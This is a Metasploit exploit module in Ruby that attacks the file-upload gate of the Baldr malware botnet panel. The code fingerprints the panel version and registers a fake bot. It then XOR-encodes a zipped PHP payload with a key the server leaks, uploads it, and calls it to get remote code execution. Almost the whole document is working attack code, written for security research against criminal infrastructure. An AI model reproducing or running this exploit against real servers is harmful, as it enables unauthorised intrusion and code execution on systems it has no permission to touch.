# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;net/http&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Baldr Botnet Panel Shell Upload Exploit",
      &#039;Description&#039;    => %q{
        This module exploits the file upload vulnerability of baldr malware panel.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Ege BalcÄ± <ege.balci@invictuseurope.com>&#039; # author & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://prodaft.com&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;SSL&#039; => false,
          &#039;WfsDelay&#039; => 5,
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => [ ARCH_PHP],
      &#039;Targets&#039;        =>
        [
          [&#039;Auto&#039;,
            {
              &#039;Platform&#039; => &#039;PHP&#039;,
              &#039;Arch&#039; => ARCH_PHP,
            }
          ],
          [&#039;Baldr <= v2.0&#039;,
            {
              &#039;Platform&#039; => &#039;PHP&#039;,
              &#039;Arch&#039; => ARCH_PHP,
            }
          ],
          [&#039;Baldr v2.2&#039;,
            {
              &#039;Platform&#039; => &#039;PHP&#039;,
              &#039;Arch&#039; => ARCH_PHP,
            }
          ],
          [&#039;Baldr v3.0 & v3.1&#039;,
            {
              &#039;Platform&#039; => &#039;PHP&#039;,
              &#039;Arch&#039; => ARCH_PHP,
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Dec 19 2018",
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the baldr gate&#039;, &#039;/&#039;]),
      ]
    )
  end

  def check 
    res = send_request_cgi(
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path,"/gate.php")
    )

    ver = &#039;&#039;

    if res.code == 200
      if res.body.include?(&#039;~;~&#039;)
        targets[3] = targets[0]
        #target = targets[3]
        ver = &#039;>= v3.0&#039;
      elsif res.body.include?(&#039;;&#039;)
        #target = targets[2]
        targets[2] = targets[0]
        ver = &#039;v2.2&#039;
      elsif res.body.size < 4
        targets[1] = targets[0]
        #target = targets[1]
        ver = &#039;<= v2.0&#039;
      else
        Exploit::CheckCode::Safe  
      end
      print_status("Baldr verison: #{ver}")
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit

    name = &#039;.&#039;+Rex::Text.rand_text_alpha(4)
    files =
    [
      {data: payload.encoded, fname: "#{name}.php"}
    ]
    zip = Msf::Util::EXE.to_zip(files) 
    hwid = Rex::Text.rand_text_alpha(8).upcase

    if targets[0]
      check
    end


    case target
    when targets[3]
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path,"/gate.php")}
      )
      key = res.body.to_s.split(&#039;~;~&#039;)[0]
      print_good("Key: #{key}")

      data = "hwid=#{hwid}&os=Windows 10 x64&cookie=0&paswd=0&credit=0&wallet=0&file=1&autofill=0&version=v3.0"
      data = xor(data,key)

      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path,"/gate.php"),
        &#039;data&#039;  => data.to_s
        }
      )

      if res.code == 200
        print_good("Bot successfully registered.")
      else
        print_error("New bot register failed !")
        return false
      end

      data = xor(zip.to_s,key)
      form = Rex::MIME::Message.new
      form.add_part(data.to_s, &#039;application/octet-stream&#039;, &#039;binary&#039;, "form-data; name=\"file\"; filename=\"file.zip\"")

      res = send_request_cgi(
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;uri&#039;       => normalize_uri(target_uri.path,"/gate.php"),
        &#039;ctype&#039;     => "multipart/form-data; boundary=#{form.bound}",
        &#039;data&#039;      => form.to_s
      )
      if res && (res.code == 200 ||res.code == 100)
        print_good("Payload uploaded to /logs/#{hwid}/#{name}.php")
      else
        print_error("Server responded with code #{res.code}") if res
        print_error("Failed to upload payload.")
        return false
      end

    when targets[2]
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path,"/gate.php")}
      )
      key = res.body.to_s.split(&#039;;&#039;)[0]
      print_good("Key: #{key}")
      data = "hwid=#{hwid}&os=Windows 7 x64&cookie=0&paswd=0&credit=0&wallet=0&file=1&autofill=0&version=v2.2***"
      data << zip.to_s
      
      result = ""
      codepoints = data.each_codepoint.to_a
      codepoints.each_index do |i|
          result += (codepoints[i] ^ key[i % key.size].ord).chr
      end

      res = send_request_cgi(
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;uri&#039;       => normalize_uri(target_uri.path,"/gate.php"),
        &#039;data&#039;      => result.to_s
      )
      if res && (res.code == 200 ||res.code == 100)
        print_good("Payload uploaded to /logs/#{hwid}/#{name}.php")
      else
        print_error("Server responded with code #{res.code}") if res
        print_error("Failed to upload payload.")
        return false
      end
    else
      res = send_request_cgi(
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;uri&#039;       => normalize_uri(target_uri.path,"/gate.php"),
        &#039;data&#039;      => zip.to_s,
        &#039;encode_params&#039; => true,
        &#039;vars_get&#039;  => {
          &#039;hwid&#039;  => hwid,
          &#039;os&#039;  => &#039;Windows 7 x64&#039;,
          &#039;cookie&#039;  => &#039;0&#039;,
          &#039;pswd&#039;  => &#039;0&#039;,
          &#039;credit&#039;  => &#039;0&#039;,
          &#039;wallet&#039;  => &#039;0&#039;,
          &#039;file&#039;  => &#039;1&#039;,
          &#039;autofill&#039;  => &#039;0&#039;,
          &#039;version&#039;  => &#039;v2.0&#039;
        }
      )

      if res && (res.code == 200 ||res.code == 100)
        print_good("Payload uploaded to /logs/#{hwid}/#{name}.php")
      else
        print_error("Server responded with code #{res.code}") if res
        print_error("Failed to upload payload.")
        return false
      end
    end


    send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path,"/logs/#{hwid}/#{name}.php")}, 3
    )
    
    print_good("Payload successfully triggered !")
  end

  def xor(data, key)
    result = ""
    codepoints = data.each_codepoint.to_a
    codepoints.each_index do |i|
        result += (codepoints[i] ^ key[i % key.size].ord).chr
    end
    return result
  end


end

